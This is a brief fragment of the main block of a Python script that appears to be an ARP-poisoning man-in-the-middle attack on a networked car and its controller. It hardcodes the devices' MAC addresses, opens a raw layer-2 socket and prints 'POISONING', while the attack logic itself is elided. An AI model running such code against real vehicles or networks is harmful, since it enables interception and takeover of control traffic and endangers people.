...
if __name__ == "__main__":
    ...
    attackerMAC=getHwAddr(interface)
    socket = conf.L2socket(iface=interface)
    carMAC = "8e:85:ec:39:15:f3" #get_mac(carIP)
    controlMAC = "b8:27:eb:c1:cb:21"#get_mac(controlIP)
    cs = Session(attackerMAC,carMAC,controlMAC,socket,carIP,controlIP)
    print("Attacking with interface: %s CONTROLLER ip: %s mac: %s and CAR ip: %s mac: %s" %(interface,cs.controlIP,cs.controlMAC,cs.carIP,cs.carMAC))
    lv = LearningVector()
    av = AttackVector()
    #GLib.idle_add(buttonAttack,False)
    print "POISONING"
